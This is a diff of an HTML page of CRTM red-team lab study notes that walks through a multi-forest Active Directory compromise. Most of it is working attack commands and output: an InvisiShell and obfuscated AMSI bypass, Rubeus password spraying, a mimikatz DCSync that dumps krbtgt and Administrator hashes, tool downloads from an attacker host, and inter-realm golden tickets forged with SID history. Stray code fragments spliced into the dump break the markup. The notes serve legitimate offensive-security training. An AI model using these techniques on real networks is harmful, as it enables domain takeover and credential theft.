@@ -1,127 +1,6 @@
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Phase 7 - Section 10 - CRTM Study Notes</title>
-  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
-  <link rel="stylesheet" href="../../assets/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-  <style>
-    .crtm-sidebar { padding: 20px; }
-    .crtm-sidebar h3 { color: #70ffdb; margin-bottom: 15px; font-size: 1.1rem; }
-    .crtm-sidebar .portfolio-link { 
-      display: block; 
-      padding: 10px 12px; 
-      margin-bottom: 15px; 
-      color: #70ffdb; 
-      text-decoration: none; 
-      border-radius: 6px; 
-      font-size: 0.9rem; 
-      font-weight: 600;
-      background: #2a2a2a;
-      transition: all 0.2s;
-    }
-    .crtm-sidebar .portfolio-link:hover { 
-      background: #70ffdb; 
-      color: #1a1a1a; 
-    }
-    .crtm-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
-    .crtm-sidebar a:hover { background: #2a2a2a; color: #70ffdb; }
-    .crtm-sidebar a.active { background: #70ffdb; color: #1a1a1a; font-weight: 600; }
-    .main-content { max-width: 100% !important; }
-    .about { max-width: 100% !important; padding: 20px 40px !important; }
-    .notion-content { line-height: 1.6; }
-    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
-    .notion-content h1, .notion-content h2, .notion-content h3 { color: #70ffdb; margin: 20px 0 10px; }
-    .notion-content p { margin: 15px 0; color: #d6d6d6; }
-    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
-    .notion-content li { margin: 5px 0; color: #d6d6d6; }
-    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #70ffdb; }
-    .notion-content pre { background: #1e1e1e; border-left: 4px solid #70ffdb; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
-    .notion-content a { color: #70ffdb; text-decoration: underline; }
-    .notion-content strong { color: #fafafa; font-weight: 600; }
-    .course-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid #2a2a2a; }
-    .course-navigation a { display: inline-block; padding: 10px 20px; background: #2a2a2a; color: #70ffdb; text-decoration: none; border-radius: 6px; transition: all 0.2s; }
-    .course-navigation a:hover { background: #70ffdb; color: #1a1a1a; }
-    .toggle { list-style: none; padding: 0; }
-    .toggle li { margin: 10px 0; }
-    .toggle summary { cursor: pointer; font-weight: 600; color: #70ffdb; padding: 10px; background: #2a2a2a; border-radius: 6px; }
-    .toggle details[open] summary { border-radius: 6px 6px 0 0; }
-    .toggle details > div { padding: 15px; background: #1e1e1e; border-radius: 0 0 6px 6px; }
-  </style>
-</head>
-<body>
-  <main>
-    <aside class="sidebar" data-sidebar>
-      <div class="sidebar-info">
-        <figure class="avatar-box">
-          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
-        </figure>
-        <div class="info-content">
-          <h1 class="name" title="Mr Stark">Mr Stark</h1>
-          <p class="title">CRTM Study Notes</p>
-        </div>
-        <button class="info_more-btn" data-sidebar-btn>
-          <span>Show Navigation</span>
-          <ion-icon name="chevron-down"></ion-icon>
-        </button>
-      </div>
-      <div class="sidebar-info_more">
-        <div class="separator"></div>
-        <div class="crtm-sidebar">
-          <a href="../../" class="portfolio-link">← Portfolio</a>
-          <h3>Phases</h3>
-          <a href="index.html">Overview</a>
-          <a href="part-01-phase-1-sections-1-2.html">Phase 1 - Sections 1/2</a>
-          <a href="part-02-phase-2-sections-3-4-5.html">Phase 2 - Sections 3/4/5</a>
-          <a href="part-03-phase-3-sections-3-6.html">Phase 3 - Sections 3/6</a>
-          <a href="part-04-phase-4-section-7.html">Phase 4 - Section 7</a>
-          <a href="part-05-phase-5-section-8.html">Phase 5 - Section 8</a>
-          <a href="part-06-phase-6-section-9.html">Phase 6 - Section 9</a>
-          <a href="part-07-phase-7-section-10.html" class="active">Phase 7 - Section 10</a>
-          <a href="part-08-phase-8-sections-11-12.html">Phase 8 - Sections 11/12</a>
-        </div>
-        <div class="separator"></div>
-        <ul class="contacts-list">
-          <li class="contact-item">
-            <div class="icon-box">
-              <ion-icon name="arrow-back-outline"></ion-icon>
-            </div>
-            <div class="contact-info">
-              <p class="contact-title">Back</p>
-              <a href="../../../" class="contact-link">Portfolio</a>
-            </div>
-          </li>
-        </ul>
-      </div>
-    </aside>
-
-    <div class="main-content">
-      <article class="about active" data-page="about">
-        <header class="h2 article-title">Phase 7 - Section 10</header>
-        <section class="about-text notion-content">
-
-<figure><img style="width:710px" src="../../assets/crtm/06-Section10.png"/></figure>
-
-<p>In Path 7, we're shifting our focus to a multi-forest trust exploitation scenario involving <strong>IT-DC</strong>, <strong>GCB-DC</strong>, and a Windows workstation. The objective is to pivot across trust boundaries, gain domain dominance in both forests, and escalate to <strong>Enterprise Admin</strong> in the root forest. Based on the topology and steps described, here's the path we're likely to follow:</p>
-
-<p>We begin by leveraging clear-text credentials that were previously acquired from multiple forests, specifically by joining password patterns or reuse between users across these forests. This will allow us to authenticate against a domain in one forest even if the password was originally harvested in another. Using these credentials, we will modify Active Directory ACLs to escalate privileges within a target domain.</p>
-
-<p>Once we have control over the necessary permissions, we escalate to <strong>Domain Admin</strong> inside the GCB forest. This step will provide us with administrative rights over GCB-DC, enabling us to manipulate the domain configuration and trust relationships as needed.</p>
-
-<p>Now with Domain Admin privileges in gcb.local, we will initiate a cross-forest pivot to compromise the Vault Forest. The Vault Forest is likely the most critical part of the environment, holding sensitive assets or credentials. Compromising it will be the ultimate goal of this phase, and it will be achieved using trust relationships and inter-realm authentication mechanisms.</p>
-
-<p>When planning and executing multi-forest attacks, the <strong>source of the payload</strong> is just as important as the payload itself. A domain admin from a child domain logging into the forest root domain controller is a <strong>red flag</strong> for defenders, which is why we should avoid doing so directly. Instead, we will pivot using alternative methods such as <strong>token impersonation</strong>, <strong>Pass-the-Hash</strong>, or by targeting weaker trust relationships that provide lateral movement without triggering alerts.</p>
-
-<p>The ability to move across forests is highly dependent on how trusts are configured, and understanding <strong>SID history</strong> abuse becomes critical in such scenarios. By carefully selecting which credentials we use and how we move between domains, we can reduce the risk of detection while still achieving full forest dominance.</p>
-
-<h3>InvisiShell on IT-DC</h3>
-
-<p>Let's initiate a new CMDLet and do the proper PowerShell security features bypass.</p>
-
-<pre><code>set COR_ENABLE_PROFILING=1
+<section class="about-text notion-content">
+<html><body><li><details open=""><summary><strong>Phase - 7 - Section 10</strong></summary><div dir="ltr"><figure class="image"><a><img style="width:710px"/></a></figure></div><div dir="auto"><p class="">In Path 7, we're shifting our focus to a multi-forest trust exploitation scenario involving <strong>IT-DC</strong>, <strong>GCB-DC</strong>, and a Windows workstation. The objective is to pivot across trust boundaries, gain domain dominance in both forests, and escalate to <strong>Enterprise Admin</strong> in the root forest. Based on the topology and steps described, here's the path we're likely to follow:</p></div><div dir="auto"><p class="">We begin by leveraging clear-text credentials that were previously acquired from multiple forests, specifically by joining password patterns or reuse between users across these forests. This will allow us to authenticate against a domain in one forest even if the password was originally harvested in another. Using these credentials, we will modify Active Directory ACLs to escalate privileges within a target domain.</p></div><div dir="auto"><p class="">Once we have control over the necessary permissions, we escalate to <strong>Domain Admin</strong> inside the GCB forest. This step will provide us with administrative rights over GCB-DC, enabling us to manipulate the domain configuration and trust relationships as needed.</p></div><div dir="auto"><p class="">Finally, with full DA rights on the GCB side, we pivot toward the <strong>Enterprise Admin</strong> group, which resides in the root of the forest. This final escalation will give us full control across all domains in the forest structure. The end goal of Path 7 (Section 10) is to obtain <strong>Domain Admin privileges on gcb.local</strong>, confirming a complete forest compromise by chaining credential abuse and trust exploitation.</p></div><div dir="auto"><p class="">Throughout this phase, we’ll likely use a combination of ACL abuse, token impersonation, SID history or shadow principal injection, and privileged group escalation strategies.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s initiate a new CMDLet and do the proper PowerShell security features bypass.</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 
 REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
@@ -132,70 +11,13 @@ powershell
 
 set COR_ENABLE_PROFILING=
 set COR_PROFILER=
-REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre>
-
-<p>Once the new PowerShell session is initiated after running InvisiShell, we can then execute the following AMSI bypass into the current session.</p>
-
-<h1>Bruteforce credential with Rubeus</h1>
-
-<p>Back to the <strong>ESCROWs</strong> files we found, 1 from <code>MSP-DC01</code> from <strong>msp.local</strong> and the other one from <code>ACC-DATA</code> from <strong>gcbacc.local.</strong></p>
-
-<figure><img style="width:1779.949951171875px" src="../../assets/crtm/image%20247.png"/></figure>
-<figure><img style="width:1780px" src="../../assets/crtm/image%20248.png"/></figure>
-
-<p>If we combine both found credentials it its possible to see that it creates a single word "<code>Adm1n!stertheC0mp@ny</code>".</p>
-
-<p>The Rubeus brute force command was specifically designed for exactly our scenario, testing one password against many users. Rubeus handles this internally with optimized Kerberos requests, proper error code interpretation, and built-in OPSEC features like randomized delays when we use the <code>/opsec</code> flag. It stops immediately when finding valid credentials.The tool is compiled C# rather than interpreted PowerShell, making it significantly faster for large-scale operations.</p>
-
-<p>The tool will automatically test each user and stop immediately upon finding a valid credential, providing output that includes the username, domain, and the ticket information.</p>
-
-<h3>Enumerating Orgadmin's Groups</h3>
-
-<p>We were able to find who is the owner of the credentials we combined, it belongs to  <code><strong>orgadmin</strong></code> user. Let's now enumerate what group <code>Orgadmin</code> belongs to, and we will accomplish this task using ADModule</p>
-
-<p><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<p><code>Get-ADUser -Identity 'orgadmin' -Properties MemberOf | Select-Object -ExpandProperty 'MemberOf'</code></p>
-
-<figure><img style="width:1780px" src="../../assets/crtm/image%20250.png"/></figure>
-
-<p>As we can see from our enumeration, orgadmin user belongs to Organization Admins.</p>
-
-<p><code>Get-ADGroup -Identity 'organizationadmins' -Properties *</code></p>
-
-<figure><img style="width:2322px" src="../../assets/crtm/image%20251.png"/></figure>
-<figure><img style="width:2454px" src="../../assets/crtm/image%20252.png"/></figure>
-
-<p>Let's now leverage our privileges to <code><strong>orgadmin</strong></code> user, by requesting his TGT and Injecting it into our current session</p>
-
-<p><code>Rubeus.exe asktgt /user:orgadmin /password:"Adm1n!stertheC0mp@ny" /domain:it.gcb.local /opsec /force /ptt</code></p>
-
-<p><code>klist</code></p>
-
-<figure><img style="width:1780px" src="../../assets/crtm/image%20253.png"/></figure>
-
-<h3>Enumerating ACLs</h3>
-
-<p>Now, with orgadmin privileges, let's enumerate ACLs and find out if we do some interesting privileges inside this domain. The quick and easiest way is by using <code>Find-InterestingDomainAcl</code> from PowerView.ps1.</p>
-
-<p><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'orgadmin'}</code></p>
-
-<figure><img style="width:2324px" src="../../assets/crtm/image%20254.png"/></figure>
-
-<p>We can see above from our enumeration, that our user Orgadmin really have some important rights here. The user contains <code>DS-Replication-Get-Changes-In-Filtered-Set</code>, <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>.</p>
-
-<h1>DCSync</h1>
-
-<p>With the replications rights we already have, we can simply do a DCSync attack and request for KRBTGT's credentials, We will use Saftykatz.exe to accomplish this task.</p>
-
-<p><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:it\krbtgt /domain:it.gcb.local" "exit"</code></p>
-
-<figure><img style="width:2365px" src="../../assets/crtm/image%20255.png"/></figure>
-
-<ul class="toggle"><li><details open=""><summary><strong>DCSync - KRBTGT</strong></summary>
-<pre><code> .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre></div><div dir="auto"><p class="">Once the new PowerShell session is initiated after running InvisiShell, we can then execute the following AMSI bypass into the current session.</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Bruteforce credential with Rubeus</h1></div><div dir="auto"><p class="">Back to the <strong>ESCROWs</strong> files we found, 1 from <code>MSP-DC01</code> from <strong>msp.local</strong> and the other one from <code>ACC-DATA</code> from <strong>gcbacc.local. </strong></p></div><div dir="ltr"><figure class="image"><a><img style="width:1779.949951171875px"/></a></figure></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class="">If we combine both found credentials it its possible to see that it creates a single word “<code>Adm1n!stertheC0mp@ny</code>”.</p></div><div dir="auto"><p class="">The Rubeus brute force command was specifically designed for exactly our scenario, testing one password against many users. Rubeus handles this internally with optimized Kerberos requests, proper error code interpretation, and built-in OPSEC features like randomized delays when we use the <code>/opsec</code> flag. It stops immediately when finding valid credentials.The tool is compiled C# rather than interpreted PowerShell, making it significantly faster for large-scale operations.</p></div><div dir="auto"><p class="">The tool will automatically test each user and stop when it finds valid credentials, giving you both the username and a usable Kerberos ticket for further operations.</p></div><div dir="auto"><p class=""><code>Rubeus.exe brute  /password:"Adm1n!stertheC0mp@ny" /opsec /force /domain:it.gcb.local /noticket</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2193px"/></a></figure></div><div dir="auto"><p class=""><strong>Key flags</strong>:</p></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><code>/opsec</code> - Adds delays and jitter to avoid detection</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><code>/force</code> - Continues even if some users fail</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><code>/noticket</code> - Doesn't save tickets to disk</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><code>/domain:</code> - Specify target domain</li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Enumerating Orgadmin’s Groups</h3></div><div dir="auto"><p class="">We were able to find who is the owner of the credentials we combined, it belongs to  <code><strong>orgadmin</strong></code> user. Let’s now enumerate what group <code>Orgadmin</code> belongs to, and we will accomplish this task using ADModule</p></div><div dir="auto"><p class=""><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADUser -Identity 'orgadmin' -Properties MemberOf | Select-Object -ExpandProperty 'MemberOf'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class="">As we can see from our enumeration, orgadmin user belongs to Organization Admins.</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'organizationadmins' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2322px"/></a></figure></div><div dir="ltr"><figure class="image"><a><img style="width:2454px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s now leverage our privileges to <code><strong>orgadmin</strong></code> user, by requesting his TGT and Injecting it into our current session</p></div><div dir="auto"><p class=""><code>Rubeus.exe asktgt /user:orgadmin /password:"Adm1n!stertheC0mp@ny" /domain:it.gcb.local /opsec /force /ptt</code></p></div><div dir="auto"><p class=""><code>klist</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Enumerating ACLs</h3></div><div dir="auto"><p class="">Now, with orgadmin privileges, let’s enumerate ACLs and find out if we do some interesting privileges inside this domain. The quick and easiest way is by using <code>Find-InterestingDomainAcl</code> from PowerView.ps1.</p></div><div dir="auto"><p class=""><code> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'orgadmin'}</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2324px"/></a></figure></div><div dir="auto"><p class="">We can see above from our enumeration, that our user Orgadmin really have some important rights here. The user contains <code>DS-Replication-Get-Changes-In-Filtered-Set</code>, <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">DCSync</h1></div><div dir="auto"><p class="">With the replications rights we already have, we can simply do a DCSync attack and request for KRBTGT’s credentials, We will use Saftykatz.exe to accomplish this task.</p></div><div dir="auto"><p class=""><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:it\krbtgt /domain:it.gcb.local" "exit"</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2365px"/></a></figure></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>DCSync - KRBTGT</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-XML"> .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
@@ -236,14 +58,18 @@ Supplemental Credentials:
 * Primary:Kerberos-Newer-Keys *
     Default Salt : IT.GCB.LOCALkrbtgt
     Default Iterations : 4096
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       aes256_hmac       (4096) : 62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c
       aes128_hmac       (4096) : 8744ae70f355f08ac1cb5256b21421ca
       des_cbc_md5       (4096) : a1c18319fd85a283
 
 * Primary:Kerberos *
     Default Salt : IT.GCB.LOCALkrbtgt
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       des_cbc_md5       : a1c18319fd85a283
 
 * Packages *
@@ -281,11 +107,7 @@ Supplemental Credentials:
     29  60919e56073d2da726d14406cbe411d8
 
 
-mimikatz(commandline) # exit</code></pre>
-</details></li></ul>
-
-<ul class="toggle"><li><details open=""><summary><strong>DCSync - Administrator</strong></summary>
-<pre><code>
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>DCSync - Administrator</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-XML">
 mimikatz(commandline) # lsadump::dcsync /user:it\Administrator /domain:it.gcb.local
 [DC] 'it.gcb.local' will be the domain
 [DC] 'it-dc.it.gcb.local' will be the DC server
@@ -318,7 +140,9 @@ Supplemental Credentials:
 * Primary:Kerberos-Newer-Keys *
     Default Salt : IT.GCB.LOCALAdministrator
     Default Iterations : 4096
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       aes256_hmac       (4096) : dc36352b88a8f332112d9b6d23bbae2b9a2a0a75188fc0011ee406c829371999
       aes128_hmac       (4096) : c47ef5d828b01c05ad339104bea5ba85
       des_cbc_md5       (4096) : 856e2f1fa1d36ebc
@@ -333,7 +157,9 @@ Supplemental Credentials:
 
 * Primary:Kerberos *
     Default Salt : IT.GCB.LOCALAdministrator
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       des_cbc_md5       : 856e2f1fa1d36ebc
     OldCredentials
       des_cbc_md5       : 6462297f34ad54ae
@@ -373,74 +199,15 @@ Supplemental Credentials:
     29  08aca799afce9fc0e9e3650e239dd0cb
 
 
-mimikatz(commandline) # exit</code></pre>
-</details></li></ul>
-
-<p>As far as we remember during our enumeration phase right in the beginning, <code>it.gcb.local</code> is child-domain of <code>gcb.local</code> which is it root domain.</p>
-
-<p><code>Get-ADTrust -Filter *</code></p>
-
-<figure><img style="width:2145px" src="../../assets/crtm/image%20256.png"/></figure>
-
-<p>Now that we were able to compromise the whole child domain it.gcb.local, escalating our privileges to to Enterprise Admins and compromising gcb.local the parent domain is even easier and simple.</p>
-
-<p>Cross-domain attacks, specifically moving from a child domain to the forest root by abusing the <strong>krbtgt</strong> account, rely on the fundamental weaknesses in how Active Directory handles <strong>SID history</strong> and <strong>inter-realm Kerberos trust</strong>. When we compromise a child domain, we do not immediately have control over the forest, but through <strong>golden ticket</strong> attacks with manipulated <strong>SID history</strong>, we can escalate privileges and obtain the <strong>krbtgt hash</strong> of the forest root, effectively gaining complete control.</p>
-
-<p>The forest is the <strong>true security boundary</strong> in Active Directory, meaning that domain-level security measures cannot prevent escalation if we control a child domain. Each domain within the forest shares a transitive trust relationship, allowing authentication tokens to be exchanged between domains. If an attacker controls one domain, they can forge authentication tickets that appear legitimate to other domains in the same forest. By manipulating the <strong>SID history</strong> attribute in a golden ticket, an attacker can inject a <strong>forest root Domain Admin SID (519)</strong> into their forged ticket, making them effectively an Enterprise Admin. Since the forest root <strong>krbtgt</strong> account is shared across the entire forest, compromising it means compromising every domain within that forest. This attack works because Active Directory trusts the tickets issued by child domains when they contain valid inter-realm keys, which are derived from the <strong>krbtgt</strong> account.</p>
-
-<p>Once we gave forged our Golden ticket, let's access the Domain controller.</p>
-
-<p><code>winrs -r:it-dc.gcb.local cmd</code></p>
-
-<figure><img style="width:1780px" src="../../assets/crtm/image%20258.png"/></figure>
-
-<p>A domain admin from a child domain should not normally be logging into the forest root domain controller, making it a red flag. However, we can evade detection by using a <strong>domain controller machine account</strong> instead of a domain administrator account. By injecting the <strong>SID of domain controllers (516)</strong> and <strong>Enterprise Admins (519)</strong> into our golden ticket</p>
-
-<p>Let's start by enumerating both Domain's SIDs first using ADModule.</p>
-
-<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/ADModule-master.zip -OutFile "C:\ADModule-master.zip" -UseBasicParsing</code></p>
-
-<p><code>Expand-Archive -Path "C:\ADModule-master.zip" -DestinationPath "C:\"</code></p>
-
-<p><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<p><code>Get-ADDomain -Server 'it.gcb.local'</code></p>
-
-<figure><img style="width:1780px" src="../../assets/crtm/image%20259.png"/></figure>
-
-<p><code>Get-ADDomain -Server 'gcb.local'</code></p>
-
-<figure><img style="width:1780px" src="../../assets/crtm/image%20260.png"/></figure>
-
-<p><code>it.gcb.local SID:</code> S-1-5-21-948911695-1962824894-4291460450</p>
-
-<p><code>gcb.local SID:</code> S-1-5-21-2781415573-3701854478-2406986946</p>
-
-<p>We use <strong>Rubeus</strong> to create a <strong>Golden Ticket</strong> for the <code>administrator</code> account in the child domain (<code>it.gcb.local</code>). However, by <strong>injecting the Enterprise Admins SID from the forest root</strong>, we make the forged TGT look like it belongs to an <strong>Enterprise Admin</strong> in the entire forest. When this ticket is used, the <strong>forest root domain controller</strong> trusts it and grants <strong>privileged access to the entire AD forest</strong>.</p>
-
-<p>This is the <strong>core technique</strong> that enables <strong>child-to-forest root escalation</strong> using <strong>SID history abuse</strong>.</p>
-
-<h3>Import Rubeus into IT-DC.</h3>
-
-<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/Rubeus.exe -OutFile "C:\Rubeus.exe" -UseBasicParsing</code></p>
-
-<h3>Forging the Inter-realm Golden ticket</h3>
-
-<p><code>Rubeus.exe golden /user:Administrator /id:500 /domain:it.gcb.local /sid:S-1-5-21-948911695-1962824894-4291460450 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c /ptt</code></p>
-
-<figure><img style="width:2505px" src="../../assets/crtm/image%20261.png"/></figure>
-
-<p>With this newly forged inter-realm Golden ticket injected into our session, we can now access GCB.LOCAL Domain Controller (GCB-DC).</p>
-
-<p><code>winrs -r:gcb-dc.gcb.local cmd</code></p>
-
-<figure><img style="width:2080px" src="../../assets/crtm/image%20262.png"/></figure>
-
-<h3><strong>InvisiShell</strong></h3>
-
-<pre><code>set COR_ENABLE_PROFILING=1
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">As far as we remember during our enumeration phase right in the beginning, <code>it.gcb.local</code> is child-domain of <code>gcb.local</code> which is it root domain.</p></div><div dir="auto"><p class=""><code>Get-ADTrust -Filter *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2145px"/></a></figure></div><div dir="auto"><p class="">Now that we were able to compromise the whole child domain it.gcb.local, escalating our privileges to to Enterprise Admins and compromising gcb.local the parent domain is even easier and simple.</p></div><div dir="auto"><p class="">Cross-domain attacks, specifically moving from a child domain to the forest root by abusing the <strong>krbtgt</strong> account, rely on the fundamental weaknesses in how Active Directory handles <strong>SID history</strong> and <strong>inter-realm Kerberos trust</strong>. When we compromise a child domain, we do not immediately have control over the forest, but through <strong>golden ticket</strong> attacks with manipulated <strong>SID history</strong>, we can escalate privileges and obtain the <strong>krbtgt hash</strong> of the forest root, effectively gaining complete control.</p></div><div dir="auto"><p class="">The forest is the <strong>true security boundary</strong> in Active Directory, meaning that domain-level security measures cannot prevent escalation if we control a child domain. Each domain within the forest has its own <strong>krbtgt</strong> account, which encrypts and signs <strong>TGTs (Ticket Granting Tickets)</strong> issued by that domain’s <strong>KDC (Key Distribution Center)</strong>. However, when a user needs to authenticate across domains within the same forest, <strong>inter-realm trust</strong> is used, and this mechanism can be abused.</p></div><div dir="auto"><h2 class="">Forging Inter-Realm Golden Ticket To Access IT-DC</h2></div><div dir="auto"><p class="">Now we the it.gcb.local KRBTGT we can simply forge a Golden ticket to access the Domain Controller on the Child Domain, and we will impersonate the Administrator.</p></div><div dir="auto"><p class=""><code>Rubeus.exe golden /user:administrator /domain:it.gcb.local /opsec /ldap /aes256:62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c /ptt</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2254px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Once we gave forged our Golden ticket, let’s access the Domain controller.</p></div><div dir="auto"><p class=""><code>winrs -r:it-dc.gcb.local cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class="">A domain admin from a child domain should not normally be logging into the forest root domain controller, making it a red flag. However, we can evade detection by using a <strong>domain controller machine account</strong> instead of a domain administrator account. By injecting the <strong>SID of domain controllers (516)</strong> and <strong>Enterprise Admins (519)</strong> into our golden ticket</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s start by enumerating both Domain’s SIDs first using ADModule.</p></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri http://192.168.100.41:443/ADModule-master.zip -OutFile "C:\ADModule-master.zip" -UseBasicParsing</code></p></div><div dir="auto"><p class=""><code>Expand-Archive -Path "C:\ADModule-master.zip" -DestinationPath "C:\"</code></p></div><div dir="auto"><p class=""><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADDomain -Server 'it.gcb.local'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class=""><code>Get-ADDomain -Server 'gcb.local'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1780px"/></a></figure></div><div dir="auto"><p class=""><code>it.gcb.local SID:</code> S-1-5-21-948911695-1962824894-4291460450</p></div><div dir="auto"><p class=""><code>gcb.local SID:</code> S-1-5-21-2781415573-3701854478-2406986946</p></div><div dir="auto"><p class="">
